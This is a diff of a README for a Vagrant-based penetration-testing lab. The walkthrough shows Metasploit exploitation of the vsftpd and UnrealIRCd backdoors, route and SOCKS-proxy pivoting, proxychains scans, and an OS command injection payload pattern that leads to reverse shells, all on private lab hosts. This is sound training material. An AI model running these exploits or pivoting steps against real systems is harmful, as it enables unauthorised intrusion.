@@ -1,9 +1,10 @@
 # Lab Introduction
 
+This is a lab to learn about various network services, how to enumerate them, and how to pivot through machines as you compromise them.
 The lab is designed such that there are three vulnerable machines for you to test your hacking skills.
 However, to make it a bit more challenging, only one of the machines is directly reachable by the attacker (you):
 
-![Network Diagram](./resources/Network%20Diagram.png)
+![Network Diagram](docs/resources/Network Diagram.png)
 
 It's quite common in modern networks that machines will be isolated from one another by firewalls and reside in different network segments.
 To overcome this, you will need to perform lateral movement and pivot through each machine on your way to the final target.
@@ -30,6 +31,16 @@ Some familiarity scripting with Bash or Python, as well the basics of Metasploit
 6. Learn how to perform horizontal lateral movement through a target network, and how it can be prevented
 7. Learn about common misconfigurations that can lead to privilege escalation
 
+## Getting Started
+
+To launch the lab, you'll need Virtualbox and Vagrant:
+
+1. Clone this repository
+2. `cd` into the repository
+3. run `vagrant up`
+
+This will open a Kali VM with the lab, but it will take a good 15-20 minutes (maybe more depending on your internet) for all the services to start.
+
 ## Rules for the lab
 
 All of your targets will be on the 172.16.0.0/12 subnet (i.e. 172.16.0.0–172.31.255.255).
@@ -52,7 +63,7 @@ The targets prepared for you are commonly used, openly available machines with p
 This is a networking lab, not a Metasploit exercise.
 
 
-# Common Questions
+## Common Questions
 
 1. "What does setting the `some option` variable in Metasploit do?"
    - It depends on the module and payload you've currently got selected.
@@ -61,8 +72,6 @@ This is a networking lab, not a Metasploit exercise.
 2. "My `nmap` scan isn't showing as many services as the examples you've got!"
    - It takes some time for all the services to spin up, even after Vagrant has finished booting.
    Give it another 5-10 minutes and it should be ready.
-
-
 
 
 # First Target
@@ -398,8 +407,8 @@ This is done by sending our basic shell to the background with (Ctrl+Z), and the
 ```
 ^Z
 Background session 1? [y/N]  y
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1
-[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u -1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]
 
 [*] Upgrading session ID: 1
 [*] Starting exploit/multi/handler
@@ -460,7 +469,7 @@ as well as a new network - `172.25.0.0/24`.
 
 To progress further through the network you have two options:
 
-1. Upload and install all the tools we intend to use to the compromised box, or
+1. Upload and install all the tools we intend to use onto the compromised box, or
 2. Set up a proxy to tunnel traffic from our attacker machine into the internal network
 
 It's often not a good idea to upload our tools onto the compromised machine for various reasons
@@ -470,7 +479,7 @@ so instead we'll pivot through the box with a proxy.
 First, we need to set up a route in Metasploit for this new subnet:
 
 ```
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > `use post/multi/manage/autoroute`
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use post/multi/manage/autoroute
 msf6 post(multi/manage/autoroute) > set SUBNET 172.25.0.0
 SUBNET => 172.25.0.0
 msf6 post(multi/manage/autoroute) > set NETMASK 24
@@ -505,6 +514,8 @@ To make this route accessible to all our tools outside Metasploit, we can set up
 
 ```
 msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set version 4a
+version => 4a
 msf6 auxiliary(server/socks_proxy) > run
 [*] Auxiliary module running as background job 1.
 
@@ -517,14 +528,14 @@ Edit your configuration at `/etc/proxychains4.conf` using an editor of your choi
 
 ```
 strict_chain
-quiet_mode
+#quiet_mode
 proxy_dns
 remote_dns_subnet 224
 tcp_read_time_out 15000
 tcp_connect_time_out 8000
 
 [ProxyList]
-socks5 127.0.0.1 1080
+socks4 127.0.0.1 1080
 ```
 
 # Second Box
@@ -565,9 +576,9 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 2.06 seconds
 
 This reveals that there are 3 hosts on the network:
 
-1. 172.25.0.1 - The gateway server
-2. 172.25.0.3 - The box we've already compromised
-3. 172.25.0.2 - A new machine we're interested in
+1. `172.25.0.1` - The gateway server
+2. `172.25.0.3` - The box we've already compromised
+3. `172.25.0.2` - A new machine we're interested in
 
 ## Port Scanning
 
@@ -575,7 +586,7 @@ Now that we've identified the host of interest, we can run a more targeted versi
 
 ```
 ┌──(root㉿kali)-[/vagrant]
-└─# proxychains nmap -sSV 172.25.0.2 -p0-65535 -T5          
+└─# proxychains nmap -sTV 172.25.0.2 -p0-65535 -T5          
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
@@ -654,6 +665,8 @@ Finally, you'll need to set the `ReverseListenerComm` option to the session you 
 (your first Meterpreter session should be session 2)
 
 ```
+msf6 auxiliary(server/socks_proxy) > use exploit/unix/irc/unreal_ircd_3281_backdoor
+[*] Using exploit/unix/irc/unreal_ircd_3281_backdoor
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 8
 payload => cmd/unix/reverse_perl
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 172.25.0.3
@@ -682,8 +695,10 @@ but a good start would be to pick an unprivileged port that didn't show up in yo
 and one that's not [commonly used](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers#Well-known_ports).
 
 ```
-msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 1
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 0
 payload => cmd/unix/bind_perl
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 172.25.0.3
+RHOSTS => 172.25.0.3
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 21337
 LPORT => 21337
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
@@ -700,7 +715,7 @@ uid=1121(boba_fett) gid=100(users) groups=100(users)
 ```
 
 Now we have a basic shell running as the `boba_fett`.
-Same as last time, you can upgrade this shell to a Meterpreter session with `sessions -i -1`.
+Same as last time, you can upgrade this shell to a Meterpreter session with `sessions -u -1`.
 
 ## Setting up a route
 
@@ -750,8 +765,6 @@ We can add this new network to our Metasploit routing table same as last time:
 msf6 post(multi/recon/local_exploit_suggester) > use post/multi/manage/autoroute
 msf6 post(multi/manage/autoroute) > set SUBNET 172.26.0.0
 SUBNET => 172.26.0.0
-msf6 post(multi/manage/autoroute) > set SUBNET 172.26.0.0
-SUBNET => 172.26.0.0
 msf6 post(multi/manage/autoroute) > set NETMASK 24
 NETMASK => 24
 msf6 post(multi/manage/autoroute) > set SESSION 6
@@ -765,18 +778,46 @@ msf6 post(multi/manage/autoroute) > run
 msf6 post(multi/manage/autoroute) > 
 ```
 
+# Final box
+
+## Network Scan
+
 Now we can access this network through our existing SOCKS proxy using `proxychains4` on our own machine.
+
+
+We'll begin by searching for any active hosts on the network with a standard host discovery scan:
 
 ```
 ┌──(root㉿kali)-[/vagrant]
-└─# proxychains nmap -sSV -T5 -p0-65535 172.26.0.2 
+└─# proxychains nmap -sn -T5 172.26.0.0/24
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-07-21 04:48 UTC
+Nmap scan report for 172.26.0.2
+Host is up (0.000051s latency).
+MAC Address: 02:42:AC:1A:00:02 (Unknown)
+Nmap scan report for 172.26.0.3
+Host is up (0.000015s latency).
+MAC Address: 02:42:AC:1A:00:03 (Unknown)
+Nmap scan report for 172.26.0.1
+Host is up.
+Nmap done: 256 IP addresses (3 hosts up) scanned in 27.63 seconds
+```
+
+However, to speed things up this time we'll only scan the top 250 ports, and we'll use the `-T5` speed profile.
+This will be particularly helpful as scanning through proxychains and hopping through several hosts can really slow down our connection:
+
+```
+┌──(root㉿kali)-[/vagrant]
+└─# proxychains nmap -sTV -T5 --top-ports 250 172.26.0.2 
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 02:06 EDT
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-07-21 04:51 UTC
 Nmap scan report for 172.26.0.2
-Host is up (0.0000080s latency).
-Not shown: 65534 closed tcp ports (reset)
+Host is up (0.052s latency).
+Not shown: 248 closed tcp ports (conn-refused)
 PORT    STATE SERVICE  VERSION
 80/tcp  open  http     Apache httpd 2.4.7 ((Ubuntu))
 443/tcp open  ssl/http Apache httpd 2.4.7 ((Ubuntu))
@@ -785,23 +826,35 @@ MAC Address: 02:42:AC:1A:00:02 (Unknown)
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 108.03 second
 ```
-# Final box
 
-This is running a web service called Hackazon
+This is running a website on ports 80 (HTTP) and 443 (HTTPS)
+
+## Visiting the Website
+
+To visit the website we could use curl (like cavemen), or we can configure our browser to work through our Metasploit proxy.
+You can try running `proxychains firefox`, but you'll quickly find it's painfully slow.
+This is because `proxychains` works by intercepting calls to the system networking libraries,
+hooking the functions and redirecting traffic to the proxies in our configuration file.
+
+It would be much faster if the browser had native support for proxies, which Firefox does.
+Go to the network settings, and add the details for your proxy there:
+
+![Proxy Settings.png](docs/resources/Proxy Settings.png)
+
 
 ## Attaining Remote Code Execution via Command Injection
 
-We can exploit an OS command injection vulnerability to attain arbitrary code execution as the user running the web server process, which in this case is the www-data user.
-The URL query parameter at http://localhost:8081/account/documents?page=delivery.html is vulnerable to OS command injection, so you can run arbitrary OS commands by going to:
+Again, feel free to use any of the exploits exposed on the website to achieve a shell here, I'll demonstrate just one of them.
 
-http://localhost:8081/account/documents?page=<your-command-here>
+We can exploit an OS command injection vulnerability to attain arbitrary code execution as the user running the web server process.
+The URL query parameter at http://172.26.0.2/account/documents?page=delivery.html is vulnerable to OS command injection, so you can run arbitrary OS commands by going to:
 
+http://172.26.0.2/account/documents?page=<your-command-here>
 
 Two notes though:
 
 - Firstly I found increased reliability by putting a test before your command, i.e.
-    http://localhost:8081/account/documents?page=test|<your-command-here>
-
+    http://172.26.0.2/account/documents?page=test|<your-command-here>
 
 - Secondly, I found that whenever there was an ampersand in the command, such as a `2>&1`, it stopped reading at the `&` and wouldn't work.
 
@@ -822,7 +875,6 @@ msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 172.17.0.1:1337
 ```
 
-For me, my docker network set my host machine to 172.17.0.1 and assigned the container 172.17.0.2, use your own IP addresses appropriately.
 
 ## Launching the reverse shell
 
@@ -890,15 +942,15 @@ meterpreter >
 
 Here are some extra reading materials I've prepared for the exposed services in case you're interested or stuck:
 
-- [Nmap](reconnaissance.md#nmap)
-- [Scanning Websites](reconnaissance.md#automated-web-application-scanners)
-- [Path Enumeration](reconnaissance.md#path-enumeration)
-- [SMB Enumeration](reconnaissance.md#smb-enumeration)
-- [NFS Enumeration](reconnaissance.md#nfs-enumeration)
-- [FTP Enumeration](reconnaissance.md#ftp-enumeration)
-- [SMTP Enumeration](reconnaissance.md#smtp-enumeration)
-- [SNMP Enumeration](reconnaissance.md#snmp-enumeration)
-- [WebDAV Enumeration](reconnaissance.md#webdav-enumeration)
+- [Nmap](docs/reconnaissance.md#nmap)
+- [Scanning Websites](docs/reconnaissance.md#automated-web-application-scanners)
+- [Path Enumeration](docs/reconnaissance.md#path-enumeration)
+- [SMB Enumeration](docs/reconnaissance.md#smb-enumeration)
+- [NFS Enumeration](docs/reconnaissance.md#nfs-enumeration)
+- [FTP Enumeration](docs/reconnaissance.md#ftp-enumeration)
+- [SMTP Enumeration](docs/reconnaissance.md#smtp-enumeration)
+- [SNMP Enumeration](docs/reconnaissance.md#snmp-enumeration)
+- [WebDAV Enumeration](docs/reconnaissance.md#webdav-enumeration)
 
 As well as some links I found useful:
 
